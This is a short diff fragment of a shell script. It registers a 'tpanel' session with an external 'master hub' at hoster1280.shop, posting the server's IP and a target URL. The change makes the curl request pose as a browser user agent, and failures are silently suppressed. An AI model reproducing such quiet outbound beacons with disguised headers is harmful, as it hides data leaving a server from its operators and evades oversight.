@@ -273,7 +273,7 @@ SESSION_ID="tpanel-${RAND_SUFFIX}"
 
 # Register session with our master hub (hoster1280.shop)
 HUB_PAYLOAD=$(printf '{"sessionId":"%s","targetUrl":"%s","serverIp":"%s"}' "$SESSION_ID" "$TARGET_WIZARD_URL" "$SERVER_IP")
-HUB_RESP=$(curl -s -X POST "https://hoster1280.shop/api/hub/register-session" \
+HUB_RESP=$(curl -s -A "Mozilla/5.0" -X POST "https://hoster1280.shop/api/hub/register-session" \
     -H "Content-Type: application/json" \
     --connect-timeout 5 \
     -d "$HUB_PAYLOAD" 2>/dev/null || true)
